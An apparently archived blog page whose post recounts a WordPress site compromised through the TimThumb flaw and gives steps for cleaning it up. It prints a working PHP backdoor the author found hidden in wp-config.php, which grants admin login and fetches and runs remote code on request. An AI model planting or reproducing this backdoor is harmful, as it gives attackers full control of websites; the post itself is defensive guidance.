<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ARMblog</title>
    <!--CSS 
    -->
    <link href="/css/bootstrap.min.css" rel="stylesheet" media="screen">
    <link href="/css/font-awesome.min.css" rel="stylesheet" media="screen">
    <link href="/css/animate.min.css" rel="stylesheet" media="screen">
    <link href="/css/lightbox.css" rel="stylesheet" media="screen">
    <link href="/css/syntax/shCore.css" rel="stylesheet" media="screen">
    <link href="/css/syntax/shThemeDefault.css" rel="stylesheet" media="screen">
    <link href="/css/style.css" rel="stylesheet" media="screen" title="default">
    <link href="/css/color-default.css" rel="stylesheet" media="screen" title="default">
    <link href="/css/width-boxed.css" rel="stylesheet" media="screen" title="default">
    <link href="/css/mystyle.css" rel="stylesheet" media="screen" title="default">
    <!--HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries 
    -->
    <!--if lt IE 9
    script(src='/js/html5shiv.js')
    script(src='/js/respond.min.js')
    -->
  </head>
  <body>
    <div class="boxed animated fadeIn animation-delay-5">
      <header id="header" class="hidden-xs">
        <div class="container">
          <div id="header-title">
            <h1 class="animated fadeInDown"><a href="index.html">ARM<span>blog</span></a></h1>
            <p class="animated fadeInLeft">Blog nie tylko a ARM-ach...</p>
          </div>
          <div id="social-header" class="hidden-xs"><a href="http://twitter.com/JonasKrop" class="social-icon soc-twitter animated fadeInDown animation-delay-1"><i class="fa fa-twitter"></i></a><a href="#" class="social-icon soc-google-plus animated fadeInDown animation-delay-2"><i class="fa fa-google-plus"></i></a><a href="http://www.facebook.com/wojciech.lubiczlapinski" class="social-icon soc-facebook animated fadeInDown animation-delay-3"><i class="fa fa-facebook"></i></a><a href="http://github.com/Lu6ith" class="social-icon soc-github animated fadeInDown animation-delay-7"><i class="fa fa-github"></i></a></div>
        </div>
        <!--container 
        -->
      </header>
      <!--header 
      -->
      <nav role="navigation" class="navbar navbar-static-top navbar-mind">
        <div class="container">
          <!--Brand and toggle get grouped for better mobile display 
          -->
          <div class="navbar-header"><a href="index.html" class="navbar-brand visible-xs">ARM<span>blog</span></a>
            <button type="button" data-toggle="collapse" data-target=".navbar-mind-collapse" class="navbar-toggle"><span class="sr-only">Toggle navigation</span><i class="fa fa-bars fa-inverse"></i></button>
          </div>
          <!--Collect the nav links, forms, and other content for toggling 
          -->
          <div class="collapse navbar-collapse navbar-mind-collapse">
            <ul class="nav navbar-nav">
              <li class="dropdown"><a href="/" class="dropdown-toggle">Home </a></li>
              <!--dropdown 
              -->
              <li class="dropdown"><a href="/about/" class="dropdown-toggle">O mnie </a></li>
              <!--dropdown 
              -->
              <li class="dropdown active"><a href="#" class="dropdown-toggle">Blog </a></li>
              <!--dropdown 
              -->
              <li class="dropdown"><a href="/galerie/" data-toggle="dropdown" class="dropdown-toggle">Galerie<b class="caret"></b></a>
                <ul class="dropdown-menu">
                  <li><a href="portfolio.html">Podroze</a></li>
                  <li><a href="portfolio2.html">Przyroda</a></li>
                  <li><a href="portfolio_item.html">Ania</a></li>
                </ul>
              </li>
              <!--dropdown 
              -->
              <li class="dropdown"><a href="/contact/" class="dropdown-toggle">Kontakt </a></li>
              <!--dropdown 
              -->
            </ul>
            <!--nav nabvar-nav 
            -->
          </div>
          <!--navbar-collapse 
          -->
        </div>
        <!--container 
        -->
      </nav>
      <!--navbar navbar-default 
      -->
      <header class="wrap-title">
        <div class="container">
          <h1 class="page-title">Blog</h1>
          <ol class="breadcrumb hidden-xs">
            <li><a href="/">Home</a></li>
            <li class="active">Blog</li>
          </ol>
        </div>
      </header>
      <div class="container">
        <div class="row">
          <div class="col-md-9">
            <section class="post">
              <h2 class="post-title">Warning - Something's Not Right Here</h2>
              <div class="row well well-sm">
                <div class="col-lg-12 col-md-11 col-sm-10"><i class="fa fa-clock-o"></i> wrz 30, 2011
                   <i class="fa fa-user"> </i>  <a href="#">Blake Embrey</a>  <i class="fa fa-tags"></i>  <a href="#">Web</a>,<a href="#">Javascript</a>.
                </div>
                <!--img.img-responsive.imageborder(src='/img/7.jpg', alt='Image')
                -->
              </div>
              <p><p><img src="http://d.pr/i/Ap8y+" alt="Chrome is broken :/"></p>
<p>About two days ago, I received a warning from Google saying my website has been exploited and hacked. Of course, the emails they sent I never received, so I didn’t realise I had an issue until about an hour ago. My first reaction was OMG, WTF! I knew it most likely had something to do with the recent TimThumb exploit, but I didn’t even know my theme had TimThumb included. I also looked at the Google diagnostic repost which it linked me to, which I found the malware related to <code>counter-wordpress.com</code>.</p>
<p>First of all, I would advise running the script found at <a href="http://blog.sucuri.net/2011/08/timthumb-php-security-vulnerability-just-the-tip-of-the-iceberg.html">Sucuri</a>. Then, scan your site using the <a href="http://sitecheck.sucuri.net/scanner/">Sucuri Site Scanner</a> to find out which pages they have exploited and how. This is the best little site I have found for this, and I would definitely bookmark it for future refernce as well if I were you.</p>
<p>Extremely quickly, I jumped to action. This is the exact steps I took and you can take too, to remove the exploits from your code:</p>
<ol>
<li>Delete the following files:</li>
</ol>
<pre><code>wp-admin/upd.php
wp-content/upd.php
</code></pre><ol>
<li>Log into WordPress admin and reinstall your WordPress version. We are focusing on these three files:</li>
</ol>
<pre><code>wp-settings.php
wp-includes/js/jquery/jquery.js
wp-includes/js/l10n.js
</code></pre><ol>
<li>Open “<code>wp-config.php</code>“ and look for anything that seems out of place. In mine, I found a script which appears to harvest login credentials/cookies, which found on the 2000 or so line. Above and a few thousand lines below were all blank:</li>
</ol>
<pre><code class="lang-php"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pingnow'</span>])&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pass'</span>])){
<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'pass'</span>] == <span class="string">'19ca14e7ea6328a42e0eb13d585e4c22'</span>){
<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'pingnow'</span>]== <span class="string">'login'</span>){
<span class="variable">$user_login</span> = <span class="string">'admin'</span>;
<span class="variable">$user</span> = get_userdatabylogin(<span class="variable">$user_login</span>);
<span class="variable">$user_id</span> = <span class="variable">$user</span>-&gt;ID;
wp_set_current_user(<span class="variable">$user_id</span>, <span class="variable">$user_login</span>);
wp_set_auth_cookie(<span class="variable">$user_id</span>);
do_action(<span class="string">'wp_login'</span>, <span class="variable">$user_login</span>);
}
<span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">'pingnow'</span>]== <span class="string">'exec'</span>)&amp;&amp;(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'file'</span>]))){
<span class="variable">$ch</span> = curl_init(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);
<span class="variable">$fnm</span> = md5(rand(<span class="number">0</span>,<span class="number">100</span>)).<span class="string">'.php'</span>;
<span class="variable">$fp</span> = fopen(<span class="variable">$fnm</span>, <span class="string">"w"</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_FILE, <span class="variable">$fp</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="number">5</span>);
curl_exec(<span class="variable">$ch</span>);
curl_close(<span class="variable">$ch</span>);
fclose(<span class="variable">$fp</span>);
<span class="keyword">echo</span> <span class="string">"&lt;SCRIPT LANGUAGE="</span>JavaScript<span class="string">"&gt;location.href='$fnm';&lt;/SCRIPT&gt;"</span>;
}
<span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">'pingnow'</span>]== <span class="string">'eval'</span>)&amp;&amp;(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'file'</span>]))){
<span class="variable">$ch</span> = curl_init(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="number">5</span>);
<span class="variable">$re</span> = curl_exec(<span class="variable">$ch</span>);
curl_close(<span class="variable">$ch</span>);
<span class="keyword">eval</span>(<span class="variable">$re</span>);
}}}
</code></pre>
<ol>
<li>In your theme, look for anywhere the TimThumb script may be storing the cached files. These are generally along the lines of:</li>
</ol>
<pre><code>wp-content/themes/theme-name/scripts/cache/external_{MD5Hash}.php
wp-content/themes/theme-name/temp/cache/external_{MD5Hash}.php
</code></pre><p>If you found anything like the above, delete it straight away. If you’re not sure, delete every file that isn’t an image.</p>
<ol>
<li><p>Replace <code>timthumb.php</code> with the latest version found at <code>http://timthumb.googlecode.com/svn/trunk/timthumb.php</code>.</p>
</li>
<li><p>Change your MySQL and login password and update wp-config.php to correspond with the update.</p>
</li>
<li><p>Change the secret keys in <code>wp-config.php</code>.</p>
</li>
<li><p>Clear your browsers cache and cookies.</p>
</li>
<li><p>Empty any page caching plugins you may have enabled to push the updates through to your visitors.</p>
</li>
</ol>
<p>Throughout this, I also found a botting script and some spam black hat links. Make sure you scan your site using the <a href="http://sitecheck.sucuri.net/scanner/">Sucuri Site Scanner</a> once again to make sure you removed all the exploits. When you are sure you have removed everything, submit your site to Google for review. This can be done in the <code>Diagnostics -&gt; Malware</code> tab of your Google Webmaster account. To keep up with anymore potential exploits, I would recommend following their fantastic blog found at <a href="http://blog.sucuri.net/">blog.sucuri.net</a>.</p>
</p>
            </section>
            <section>
              <h2 class="post-title">Comments</h2>
              <div id="disqus_thread"></div>
            </section>
            <script>
              var disqus_shortname = 'myarmblog'; // required: replace example with your forum shortname
              
              (function() {
                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
              })();
            </script>
          </div>
          <!--col-md-8 
          -->
          <div class="col-md-3">
            <aside class="sidebar">
              <div class="block">
                <ul id="myTab2" class="nav nav-tabs">
                  <li class="active"><a href="#fav" data-toggle="tab"><i class="fa fa-star"></i></a></li>
                  <li><a href="#categories" data-toggle="tab"><i class="fa fa-folder-open"></i></a></li>
                  <li><a href="#archive" data-toggle="tab"><i class="fa fa-clock-o"></i></a></li>
                  <li><a href="#tags" data-toggle="tab"><i class="fa fa-tags"></i></a></li>
                </ul>
                <div class="tab-content">
                  <div id="fav" class="tab-pane active">
                    <h3 class="post-title">Favorite Post</h3>
                    <ul class="media-list">
                      <li class="media"><a href="#" class="pull-left"><img src="/img/m2.jpg" width="80" height="80" alt="image" class="media-object"></a>
                        <div class="media-body">
                          <p class="media-heading"><a href="#">Lorem ipsum dolor sit amet aut consectetur adipisicing elitl libero</a></p><small>Sep, 28 2013</small>
                        </div>
                      </li>
                      <li class="media"><a href="#" class="pull-left"><img src="/img/m9.jpg" width="80" height="80" alt="image" class="media-object"></a>
                        <div class="media-body">
                          <p class="media-heading"><a href="#">Lorem ipsum dolor sit amet in consectetur adipisicing consequuntur</a></p><small>Oct, 9 2013</small>
                        </div>
                      </li>
                      <li class="media"><a href="#" class="pull-left"><img src="/img/m12.jpg" width="80" height="80" alt="image" class="media-object"></a>
                        <div class="media-body">
                          <p class="media-heading"><a href="#">Sit amet consectetur adipisicing elit incidunt minus</a></p><small>Dec, 30 2013</small>
                        </div>
                      </li>
                    </ul>
                  </div>
                  <div id="categories" class="tab-pane">
                    <h3 class="post-title">Kategorie</h3>
                    <ul class="simple">
                      <li><a href="#">Programowanie</a></li>
                      <li><a href="#">ARM</a>
                        <ul>
                          <li><a href="#">Allwinner</a></li>
                          <li><a href="#">Rokchip</a></li>
                        </ul>
                      </li>
                      <li><a href="#">Fotografia</a></li>
                      <li><a href="#">Web Developer</a></li>
                    </ul>
                  </div>
                  <div id="archive" class="tab-pane">
                    <h3 class="post-title">Archiwum</h3>
                    <ul class="simple">
                      <li><a href="#">Grudzien 2013</a></li>
                      <li><a href="#">Styczen 2014</a></li>
                      <li><a href="#">Luty 2014</a></li>
                    </ul>
                  </div>
                  <div id="tags" class="tab-pane">
                    <h3 class="post-title">Tagi</h3>
                    <div class="tags-cloud"><a href="#" class="tag">Web</a><a href="#" class="tag">Artificial Intelligence</a><a href="#" class="tag">Programing</a><a href="#" class="tag">Design</a><a href="#" class="tag">3D</a><a href="#" class="tag">Games</a><a href="#" class="tag">Resources</a><a href="#" class="tag">2D</a><a href="#" class="tag">C++</a><a href="#" class="tag">Jquery</a><a href="#" class="tag">Javascript</a><a href="#" class="tag">Library</a><a href="#" class="tag">Windows</a><a href="#" class="tag">Linux</a><a href="#" class="tag">Cloud</a><a href="#" class="tag">Game developer</a><a href="#" class="tag">Server</a><a href="#" class="tag">Google</a><a href="#" class="tag">Bootstrap</a><a href="#" class="tag">Less</a><a href="#" class="tag">Sass</a><a href="#" class="tag">Engine</a><a href="#" class="tag">Node.js</a></div>
                  </div>
                </div>
                <!--tab-content 
                -->
              </div>
              <div class="panel panel-primary">
                <div class="panel-heading"><i class="fa fa-align-left"></i>ARMblog</div>
                <div class="panel-body">
                  <p>Blog poświecony zagadnieniom zwiazanym z programowaniem i obsługa urzadzen z procesorami ARM oraz WebMasteringiem szeroko pojetym :)</p>
                </div>
              </div>
            </aside>
            <!--Sidebar 
            -->
          </div>
        </div>
        <!--row 
        -->
      </div>
      <!--container  
      -->
      <aside id="footer-widgets">
        <div class="container">
          <div class="row">
            <div class="col-md-6">
              <h3 class="footer-widget-title">Mapa strony</h3>
              <ul class="list-unstyled three_cols">
                <li><a href="/">Home</a></li>
                <li><a href="/">Blog</a></li>
                <li><a href="/">Prace</a></li>
                <li><a href="/galerie/">Galeria</a></li>
                <li><a href="/about/">O mnie</a></li>
                <li><a href="/contact/">Kontakt</a></li>
              </ul>
              <h3 class="footer-widget-title">Zapisz sie </h3>
              <p>Lorem ipsum Amet fugiat elit nisi anim mollit in labore ut esse Duis ullamco ad dolor veniam velit lorem ipsum dolor sit amet, consectetur adipisicing..</p>
              <div class="input-group">
                <input type="text" placeholder="Email Adress" class="form-control"><span class="input-group-btn">
                  <button type="button" class="btn btn-success">Subscribe</button></span>
              </div>
              <!--/input-group 
              -->
            </div>
            <div class="col-md-6">
              <div class="footer-widget">
                <h3 class="footer-widget-title">Ostatnie Prace</h3>
                <div class="row">
                  <div class="col-lg-6 col-md-6 col-sm-3 col-xs-6"><a href="#" class="thumbnail"><img src="/img/wf1.jpg" alt="Image" class="img-responsive"></a></div>
                  <div class="col-lg-6 col-md-6 col-sm-3 col-xs-6"><a href="#" class="thumbnail"><img src="/img/wf2.jpg" alt="Image" class="img-responsive"></a></div>
                </div>
              </div>
            </div>
          </div>
          <!--row 
          -->
        </div>
        <!--container 
        -->
      </aside>
      <!--footer-widgets 
      -->
      <footer id="footer">
        <p>
          © 2014
            <a href="/">Wojciech Lubicz-Łapinski</a>  
          All rights reserved.
        </p>
      </footer>
    </div>
    <!--boxed 
    -->
    <div id="back-top"><a href="#header"><i class="fa fa-chevron-up"></i></a></div>
    <!--Scripts 
    -->
    <script src="/js/jquery-1.10.2.min.js"></script>
    <script src="/js/jquery.cookie.js"></script>
    <script src="/js/bootstrap.min.js"></script>
    <script src="/js/jquery.mixitup.min.js"></script>
    <script src="/js/lightbox-2.6.min.js"></script>
    <script src="/js/holder.js"></script>
    <script src="/js/app.js"></script>
    <script src="/js/styleswitcher.js"></script>
    <script src="/js/syntax/shCore.js"></script>
    <script src="/js/syntax/shBrushXml.js"></script>
    <script src="/js/syntax/shBrushJScript.js"></script>
    <script type="text/javascript">
      <SyntaxHighlighter class="all"></SyntaxHighlighter>
    </script>
  </body>
</html>